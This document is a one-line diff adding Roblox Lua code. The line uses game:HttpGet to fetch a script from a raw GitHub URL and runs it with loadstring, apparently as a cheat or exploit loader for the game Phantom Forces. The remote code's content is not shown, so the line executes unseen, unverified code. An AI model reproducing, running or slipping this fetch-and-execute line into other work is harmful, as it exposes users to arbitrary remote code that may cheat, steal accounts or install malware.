@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/fall-weapon-remodels-phantom-forces-spam4-cw9z760qjngqeq.lua"))()
